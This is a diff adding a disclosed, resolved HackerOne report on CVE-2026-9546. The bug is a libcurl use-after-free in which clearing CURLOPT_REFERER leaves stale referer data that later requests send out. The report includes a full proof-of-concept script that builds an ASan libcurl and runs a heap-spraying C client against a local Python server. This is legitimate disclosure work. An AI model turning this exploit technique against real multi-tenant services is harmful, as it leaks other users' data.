@@ -1,0 +1,113 @@
+{
+  "id": 3754343,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzU0MzQz",
+  "url": "https://hackerone.com/reports/3754343",
+  "title": "CVE-2026-9546: sending old referer",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2026-05-22T03:13:05.737Z",
+  "submitted_at": "2026-05-22T03:13:06.037Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "fafawf",
+    "url": "/fafawf",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2026-9546"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-06-24T08:27:22.559Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-06-24T06:15:54.810Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nlibcurl documents that `CURLOPT_REFERER` can be set to `NULL` to disable the\nReferer header again, but doing so after a transfer does not clear the cached\nper-handle referer state. As a result, the next HTTP request on the same easy\nhandle can still send the previous request's `Referer:` value to a different\norigin even though the application explicitly cleared it with the documented\nAPI.\n\nThis is a real cross-request confidentiality problem for applications that pool\nor reuse easy handles across different jobs, users, or tenants. The easiest\nsecurity framing is not \"a remote server can crash curl in isolation\", but\nrather: a later attacker-controlled job can receive a previous job's referer on\nthe wire because libcurl failed to honor the documented clear operation.\n\nInternally, the bug is caused by `data->state.referer` retaining a dangling\npointer after `CURLOPT_REFERER=NULL`. Under ASan, the next request reliably hits\na library-internal heap-use-after-free. If the freed chunk is reused before the\nnext transfer, libcurl can also send the new heap contents as `Referer:`.\n\n## Most credible security boundary\n\nThe strongest real-world scenario I found is:\n\n1. a server-side fetcher / crawler / screenshot service keeps one easy handle\n   per worker so that it can reuse connections, which libcurl explicitly\n   encourages\n2. tenant A performs a request that legitimately needs a custom `Referer:`\n   header, for example to satisfy an origin check or hotlink policy, and that\n   referer contains a private dashboard URL, opaque job token, or internal path\n3. after the request completes, the framework calls\n   `curl_easy_setopt(easy, CURLOPT_REFERER, NULL)` exactly as documented to\n   clear that per-request state while keeping the easy handle alive\n4. tenant B later gets the same worker / easy handle and asks the service to\n   fetch an attacker-controlled URL\n5. B's server receives A's stale `Referer:` value, or another heap string that\n   reused the freed referer chunk\n\nThis is why I am reporting it as a low-severity libcurl security issue rather\nthan only a robustness bug:\n\n- the application follows documented libcurl behavior\n- the application uses encouraged easy-handle reuse\n- the confidentiality breach crosses a real trust boundary between jobs or\n  tenants\n- the leak is visible on the network to the attacker-controlled next origin\n\nI would suggest evaluating it as a low-severity cross-request data exposure\nissue, with the UAF as the implementation mechanism.\n\n## Affected version\nValidated on current curl master:\n\n`d24652971a636a4b2374367434ed72bb561b79bc`\n\n`curl-8_20_0-154-gd24652971a`\n\nPlatform used for reproduction:\n\n`Linux x86_64`\n\nThe issue is in normal libcurl HTTP request construction and does not require an\nexperimental feature, debug-only code, a special TLS backend, or a malformed API\ncall. The proof of concept below uses only documented API calls and a local HTTP\nserver. The ASan phase proves the underlying UAF; the leak phase proves that the\nstale per-handle referer state can become attacker-observable on the next HTTP\nrequest.\n\n## Steps To Reproduce:\nFrom the curl repository root, copy and paste the following script. It is\nself-contained: it writes the C client and Python HTTP server into a temporary\ndirectory and does not call any pre-existing PoC file from the repository.\n\n```bash\nset -euo pipefail\n\nROOT=\"${ROOT:-$PWD}\"\nWORKDIR=\"$(mktemp -d \"${TMPDIR:-/tmp}/curl-referer-uaf-inline-XXXXXX\")\"\nBUILD_DIR=\"$WORKDIR/build-curl-asan\"\nSERVER_LOG=\"$WORKDIR/server.jsonl\"\nSERVER_ERR=\"$WORKDIR/server.err\"\nPORT_FILE=\"$WORKDIR/port\"\nCLIENT_C=\"$WORKDIR/referer_uaf_client.c\"\nCLIENT_BIN=\"$WORKDIR/referer_uaf_client\"\nASAN_LOG=\"$WORKDIR/asan.log\"\nLEAK_LOG=\"$WORKDIR/leak.log\"\nSERVER_PID=\"\"\n\ncleanup() {\n  if [ -n \"$SERVER_PID\" ]; then\n    kill \"$SERVER_PID\" >/dev/null 2>&1 || true\n    wait \"$SERVER_PID\" 2>/dev/null || true\n  fi\n  if [ \"${KEEP_WORKDIR:-0}\" = \"1\" ]; then\n    echo \"[*] workdir kept at: $WORKDIR\"\n  else\n    rm -rf \"$WORKDIR\"\n  fi\n}\ntrap cleanup EXIT\n\nneed_cmd() {\n  command -v \"$1\" >/dev/null 2>&1 || {\n    echo \"[!] missing required command: $1\" >&2\n    exit 1\n  }\n}\n\nneed_cmd cmake\nneed_cmd cc\nneed_cmd python3\n\nif [ ! -f \"$ROOT/CMakeLists.txt\" ] || [ ! -d \"$ROOT/lib\" ] ||\n   [ ! -d \"$ROOT/include\" ]; then\n  echo \"[!] run this script from the curl repository root\" >&2\n  exit 1\nfi\n\ncat >\"$CLIENT_C\" <<'EOF'\n#include <curl/curl.h>\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n#define REFERER_TOTAL_LEN 96U\n#define MAX_SPRAY_ALLOCS 4096U\n\nstruct spray_hold {\n  char **items;\n  size_t count;\n};\n\nstatic size_t sink(char *ptr, size_t size, size_t nmemb, void *userdata)\n{\n  (void)ptr;\n  (void)userdata;\n  return size * nmemb;\n}\n\nstatic char *join_url(const char *base, const char *path)\n{\n  size_t base_len = strlen(base);\n  size_t path_len = strlen(path);\n  char *out = malloc(base_len + path_len + 1U);\n\n  if(!out)\n    return NULL;\n\n  memcpy(out, base, base_len);\n  memcpy(out + base_len, path, path_len + 1U);\n  return out;\n}\n\nstatic char *make_padded_url(const char *prefix, char fill)\n{\n  size_t prefix_len = strlen(prefix);\n  char *out;\n\n  if(prefix_len >= REFERER_TOTAL_LEN)\n    return NULL;\n\n  out = malloc(REFERER_TOTAL_LEN + 1U);\n  if(!out)\n    return NULL;\n\n  memcpy(out, prefix, prefix_len);\n  memset(out + prefix_len, fill, REFERER_TOTAL_LEN - prefix_len);\n  out[REFERER_TOTAL_LEN] = '\\0';\n  return out;\n}\n\nstatic void free_spray(char **spray, size_t count)\n{\n  size_t i;\n\n  if(!spray)\n    return;\n\n  for(i = 0; i < count; ++i)\n    free(spray[i]);\n  free(spray);\n}\n\nstatic char *recycle_referer_chunk(const char *target, const char *marker,\n                                   struct spray_hold *hold)\n{\n  char **spray;\n  size_t marker_size = strlen(marker) + 1U;\n  size_t i;\n\n  if(!target || !hold)\n    return NULL;\n\n  hold->items = NULL;\n  hold->count = 0U;\n\n  spray = calloc(MAX_SPRAY_ALLOCS, sizeof(*spray));\n  if(!spray)\n    return NULL;\n\n  for(i = 0; i < MAX_SPRAY_ALLOCS; ++i) {\n    spray[i] = malloc(marker_size);\n    if(!spray[i]) {\n      free_spray(spray, i);\n      return NULL;\n    }\n\n    memcpy(spray[i], marker, marker_size);\n    if((const void *)spray[i] == (const void *)target) {\n      hold->items = spray;\n      hold->count = i + 1U;\n      fprintf(stderr, \"recycled_referer_ptr=%p\\n\", (const void *)spray[i]);\n      return spray[i];\n    }\n  }\n\n  free_spray(spray, MAX_SPRAY_ALLOCS);\n  return NULL;\n}\n\nstatic CURLcode do_request(CURL *easy, const char *url)\n{\n  CURLcode rc;\n\n  rc = curl_easy_setopt(easy, CURLOPT_URL, url);\n  if(rc != CURLE_OK)\n    return rc;\n\n  return curl_easy_perform(easy);\n}\n\nint main(int argc, char **argv)\n{\n  CURL *easy = NULL;\n  CURLcode rc;\n  const char *mode;\n  const char *base_url;\n  char *first_url = NULL;\n  char *second_url = NULL;\n  char *initial_referer = NULL;\n  char *leak_marker = NULL;\n  char *recycled = NULL;\n  char *used_referer = NULL;\n  char *stale_referer = NULL;\n  struct spray_hold spray = { NULL, 0U };\n  int exitcode = 1;\n\n  if(argc != 3) {\n    fprintf(stderr, \"usage: %s <asan|leak> <base_url>\\n\", argv[0]);\n    return 2;\n  }\n\n  mode = argv[1];\n  base_url = argv[2];\n\n  if(strcmp(mode, \"asan\") && strcmp(mode, \"leak\")) {\n    fprintf(stderr, \"unsupported mode: %s\\n\", mode);\n    return 2;\n  }\n\n  first_url = join_url(base_url,\n                       !strcmp(mode, \"asan\") ? \"/asan-first\" : \"/leak-first\");\n  second_url = join_url(base_url,\n                        !strcmp(mode, \"asan\") ? \"/asan-second\" :\n                        \"/leak-second\");\n  initial_referer = make_padded_url(\"https://initial.invalid/\", 'A');\n  leak_marker = make_padded_url(\"https://reused.invalid/\", 'B');\n  if(!first_url || !second_url || !initial_referer || !leak_marker) {\n    fprintf(stderr, \"failed to allocate URLs or referers\\n\");\n    goto out;\n  }\n\n  rc = curl_global_init(CURL_GLOBAL_DEFAULT);\n  if(rc != CURLE_OK) {\n    fprintf(stderr, \"curl_global_init: %s\\n\", curl_easy_strerror(rc));\n    goto out;\n  }\n\n  easy = curl_easy_init();\n  if(!easy) {\n    fprintf(stderr, \"curl_easy_init failed\\n\");\n    goto out;\n  }\n\n  curl_easy_setopt(easy, CURLOPT_NOPROXY, \"*\");\n  curl_easy_setopt(easy, CURLOPT_TIMEOUT_MS, 3000L);\n  curl_easy_setopt(easy, CURLOPT_WRITEFUNCTION, sink);\n\n  rc = curl_easy_setopt(easy, CURLOPT_REFERER, initial_referer);\n  if(rc != CURLE_OK) {\n    fprintf(stderr, \"set initial referer: %s\\n\", curl_easy_strerror(rc));\n    goto out;\n  }\n\n  rc = do_request(easy, first_url);\n  if(rc != CURLE_OK) {\n    fprintf(stderr, \"first perform: %s\\n\", curl_easy_strerror(rc));\n    goto out;\n  }\n\n  rc = curl_easy_getinfo(easy, CURLINFO_REFERER, &used_referer);\n  if(rc != CURLE_OK) {\n    fprintf(stderr, \"getinfo before clear: %s\\n\", curl_easy_strerror(rc));\n    goto out;\n  }\n\n  fprintf(stderr, \"before_clear_referer_ptr=%p\\n\", (void *)used_referer);\n\n  rc = curl_easy_setopt(easy, CURLOPT_REFERER, NULL);\n  if(rc != CURLE_OK) {\n    fprintf(stderr, \"clear referer: %s\\n\", curl_easy_strerror(rc));\n    goto out;\n  }\n\n  rc = curl_easy_getinfo(easy, CURLINFO_REFERER, &stale_referer);\n  if(rc != CURLE_OK) {\n    fprintf(stderr, \"getinfo after clear: %s\\n\", curl_easy_strerror(rc));\n    goto out;\n  }\n\n  fprintf(stderr, \"after_clear_referer_ptr=%p\\n\", (void *)stale_referer);\n  if(stale_referer == used_referer && stale_referer)\n    fprintf(stderr, \"stale pointer persisted after CURLOPT_REFERER=NULL\\n\");\n\n  if(!strcmp(mode, \"leak\")) {\n    recycled = recycle_referer_chunk(stale_referer, leak_marker, &spray);\n    if(!recycled) {\n      fprintf(stderr, \"failed to recycle the freed referer chunk\\n\");\n      goto out;\n    }\n    fprintf(stderr, \"expected_leak_referer=%s\\n\", recycled);\n  }\n\n  rc = do_request(easy, second_url);\n  fprintf(stderr, \"second perform rc=%d (%s)\\n\", (int)rc,\n          curl_easy_strerror(rc));\n  if(rc != CURLE_OK)\n    goto out;\n\n  exitcode = 0;\n\nout:\n  curl_easy_cleanup(easy);\n  curl_global_cleanup();\n  free(first_url);\n  free(second_url);\n  free(initial_referer);\n  free(leak_marker);\n  free_spray(spray.items, spray.count);\n  return exitcode;\n}\nEOF\n\npython3 -u - \"$SERVER_LOG\" \"$PORT_FILE\" >\"$SERVER_ERR\" 2>&1 <<'PY' &\nimport http.server\nimport json\nimport sys\nfrom socketserver import ThreadingMixIn\n\nlog_path, port_path = sys.argv[1], sys.argv[2]\n\nclass ThreadingHTTPServer(ThreadingMixIn, http.server.HTTPServer):\n    daemon_threads = True\n    allow_reuse_address = True\n\nclass Handler(http.server.BaseHTTPRequestHandler):\n    protocol_version = \"HTTP/1.1\"\n\n    def do_GET(self):\n        entry = {\n            \"path\": self.path,\n            \"referer\": self.headers.get(\"Referer\"),\n            \"headers\": {k: v for k, v in self.headers.items()},\n        }\n        with open(log_path, \"a\", encoding=\"utf-8\") as f:\n            f.write(json.dumps(entry, ensure_ascii=True) + \"\\n\")\n        body = b\"ok\\n\"\n        self.send_response(200)\n        self.send_header(\"Content-Length\", str(len(body)))\n        self.end_headers()\n        self.wfile.write(body)\n\n    def log_message(self, fmt, *args):\n        pass\n\nserver = ThreadingHTTPServer((\"127.0.0.1\", 0), Handler)\nwith open(port_path, \"w\", encoding=\"ascii\") as f:\n    f.write(str(server.server_address[1]))\nserver.serve_forever()\nPY\nSERVER_PID=$!\n\nfor _ in $(seq 1 50); do\n  if [ -s \"$PORT_FILE\" ]; then\n    break\n  fi\n  sleep 0.1\ndone\n\nif [ ! -s \"$PORT_FILE\" ]; then\n  echo \"[!] failed to start local HTTP server\" >&2\n  cat \"$SERVER_ERR\" >&2 || true\n  exit 1\nfi\n\nJOBS=\"$(getconf _NPROCESSORS_ONLN 2>/dev/null || echo 2)\"\nif [ -z \"$JOBS\" ] || [ \"$JOBS\" -lt 1 ] 2>/dev/null; then\n  JOBS=2\nfi\n\necho \"[*] building ASan libcurl in $BUILD_DIR\"\ncmake -S \"$ROOT\" -B \"$BUILD_DIR\" \\\n  -DCMAKE_BUILD_TYPE=Debug \\\n  -DBUILD_CURL_EXE=OFF \\\n  -DBUILD_SHARED_LIBS=ON \\\n  -DBUILD_LIBCURL_DOCS=OFF \\\n  -DBUILD_MISC_DOCS=OFF \\\n  -DENABLE_CURL_MANUAL=OFF \\\n  -DHTTP_ONLY=ON \\\n  -DCURL_ENABLE_SSL=OFF \\\n  -DCURL_USE_PKGCONFIG=OFF \\\n  -DCURL_USE_CMAKECONFIG=OFF \\\n  -DCURL_ZLIB=OFF \\\n  -DCURL_BROTLI=OFF \\\n  -DCURL_ZSTD=OFF \\\n  -DCURL_USE_LIBPSL=OFF \\\n  -DCURL_USE_LIBSSH=OFF \\\n  -DCURL_USE_LIBSSH2=OFF \\\n  -DUSE_LIBIDN2=OFF \\\n  -DUSE_NGHTTP2=OFF \\\n  -DCMAKE_C_FLAGS=\"-fsanitize=address -fno-omit-frame-pointer -g -O0\" \\\n  -DCMAKE_EXE_LINKER_FLAGS=\"-fsanitize=address\" \\\n  >/dev/null\ncmake --build \"$BUILD_DIR\" -j\"$JOBS\" >/dev/null\n\nLIBDIR=\"$BUILD_DIR/lib\"\nLIBNAME=\"curl-d\"\nif [ ! -e \"$LIBDIR/libcurl-d.so\" ]; then\n  LIBNAME=\"curl\"\nfi\n\nEXTRA_LIBS=\"\"\nadd_lib_if_available() {\n  lib=\"$1\"\n  if printf 'int main(void){return 0;}\\n' |\n     cc -x c - -Wl,--no-as-needed -l\"$lib\" -o \"$WORKDIR/check-$lib\" \\\n       >/dev/null 2>&1; then\n    EXTRA_LIBS=\"$EXTRA_LIBS -l$lib\"\n  fi\n}\n\n# Some curl CMake builds compile optional backend objects into libcurl even\n# when the PoC only uses plain HTTP. Add available runtime libraries so the\n# temporary test client can link and load the ASan libcurl reliably.\nfor lib in ssl crypto z brotlidec brotlicommon zstd psl; do\n  add_lib_if_available \"$lib\"\ndone\n\ncc -fsanitize=address -fno-omit-frame-pointer -g -O0 \\\n  -I\"$ROOT/include\" -I\"$BUILD_DIR/lib\" \\\n  \"$CLIENT_C\" \\\n  -L\"$LIBDIR\" -Wl,-rpath,\"$LIBDIR\" -l\"$LIBNAME\" \\\n  -Wl,--no-as-needed $EXTRA_LIBS -Wl,--as-needed \\\n  -o \"$CLIENT_BIN\"\n\nPORT=\"$(cat \"$PORT_FILE\")\"\nBASE_URL=\"http://127.0.0.1:$PORT\"\necho \"[*] base URL: $BASE_URL\"\n\necho \"[*] phase 1: ASan UAF reproduction\"\nset +e\nASAN_OPTIONS=\"detect_leaks=0:abort_on_error=1:halt_on_error=1\" \\\n  LD_LIBRARY_PATH=\"$LIBDIR${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}\" \\\n  \"$CLIENT_BIN\" asan \"$BASE_URL\" >\"$ASAN_LOG\" 2>&1\nASAN_RC=$?\nset -e\n\nif [ \"$ASAN_RC\" -eq 0 ]; then\n  echo \"[!] ASan phase unexpectedly succeeded\" >&2\n  cat \"$ASAN_LOG\" >&2\n  exit 1\nfi\n\nif ! grep -q \"AddressSanitizer: heap-use-after-free\" \"$ASAN_LOG\"; then\n  echo \"[!] ASan phase did not report heap-use-after-free\" >&2\n  cat \"$ASAN_LOG\" >&2\n  exit 1\nfi\n\nif ! grep -q \"stale pointer persisted after CURLOPT_REFERER=NULL\" \"$ASAN_LOG\"; then\n  echo \"[!] stale referer pointer marker missing\" >&2\n  cat \"$ASAN_LOG\" >&2\n  exit 1\nfi\n\necho \"[+] ASan phase reproduced libcurl heap-use-after-free\"\ngrep -E \"before_clear|after_clear|heap-use-after-free|Curl_setstropt|Curl_http|http_add_hd\" \\\n  \"$ASAN_LOG\" | sed -n '1,20p'\n\necho \"[*] phase 2: recycled heap content sent as Referer\"\nset +e\nASAN_OPTIONS=\"detect_leaks=0:abort_on_error=1:halt_on_error=1:quarantine_size_mb=0:thread_local_quarantine_size_kb=0\" \\\n  LD_LIBRARY_PATH=\"$LIBDIR${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}\" \\\n  \"$CLIENT_BIN\" leak \"$BASE_URL\" >\"$LEAK_LOG\" 2>&1\nLEAK_RC=$?\nset -e\n\nif [ \"$LEAK_RC\" -ne 0 ]; then\n  echo \"[!] leak phase failed\" >&2\n  cat \"$LEAK_LOG\" >&2\n  exit 1\nfi\n\nEXPECTED_LEAK=\"$(sed -n 's/^expected_leak_referer=//p' \"$LEAK_LOG\" | tail -n 1)\"\nif [ -z \"$EXPECTED_LEAK\" ]; then\n  echo \"[!] leak phase did not print expected marker\" >&2\n  cat \"$LEAK_LOG\" >&2\n  exit 1\nfi\n\npython3 - \"$SERVER_LOG\" \"$EXPECTED_LEAK\" <<'PY'\nimport json\nimport sys\n\nlog_path, expected = sys.argv[1], sys.argv[2]\nentries = []\nwith open(log_path, \"r\", encoding=\"utf-8\") as f:\n    for line in f:\n        line = line.strip()\n        if line:\n            entries.append(json.loads(line))\n\nleak_entries = [e for e in entries if e[\"path\"] == \"/leak-second\"]\nif not leak_entries:\n    print(\"[!] no /leak-second request captured\", file=sys.stderr)\n    raise SystemExit(1)\n\nentry = leak_entries[-1]\nprint(\"[*] captured /leak-second Referer:\")\nprint(entry[\"referer\"])\nif entry[\"referer\"] != expected:\n    print(\"[!] leaked Referer does not match recycled heap payload\",\n          file=sys.stderr)\n    raise SystemExit(1)\nPY\n\necho \"[+] vulnerable:\"\necho \"    - documented CURLOPT_REFERER=NULL left data->state.referer stale\"\necho \"    - next HTTP request hit ASan heap-use-after-free inside libcurl\"\necho \"    - recycled heap content was sent to the next peer as Referer\"\n```\n\nExpected success markers:\n\n```text\n[+] ASan phase reproduced libcurl heap-use-after-free\nAddressSanitizer: heap-use-after-free\nstale pointer persisted after CURLOPT_REFERER=NULL\n[*] captured /leak-second Referer:\nhttps://reused.invalid/BBBB...\n[+] vulnerable:\n```\n\nThe relevant source behavior is:\n\n- `CURLOPT_REFERER` setter frees/replaces only\n  `set.str[STRING_SET_REFERER]`: `lib/setopt.c`\n- `Curl_pretransfer()` binds `data->state.referer` only when the current\n  referer string is non-NULL and does not clear the stale bufref in the\n  documented clear path: `lib/transfer.c`\n- the next HTTP request formats `data->state.referer` into the request header:\n  `lib/http.c`\n- `CURLINFO_REFERER` also returns that same stale pointer: `lib/getinfo.c`\n\nThis is not API misuse. `curl_easy_perform(3)` explicitly allows repeated\ntransfers on the same easy handle and says callers may use `curl_easy_setopt(3)`\nbetween transfers. `CURLOPT_REFERER(3)` explicitly says setting the option to\n`NULL` disables it again.\n\n## Impact\n\n## Summary:\nAn attacker who can control a later transfer in an application that reuses a\nlibcurl easy handle can receive stale cross-request data even after the\napplication correctly clears `CURLOPT_REFERER` with `NULL`. In multi-tenant\nfetchers, SSRF brokers, crawlers, webhook relays, or proxy services, this can\nleak a previous tenant's Referer value, an internal URL, a privacy-sensitive\npath, or another string that reuses the freed heap chunk. The same valid API\nsequence also produces a library-internal heap-use-after-free and can crash the\nprocess under normal memory-safety detection. The issue breaks libcurl's\ndocumented option-clearing contract and causes data from one logical request\nsession to be sent to a different HTTP peer.",
+  "weakness": {
+    "id": 50,
+    "name": "Use After Free"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 0,
+  "voters": [],
+  "severity": {
+    "rating": "low",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
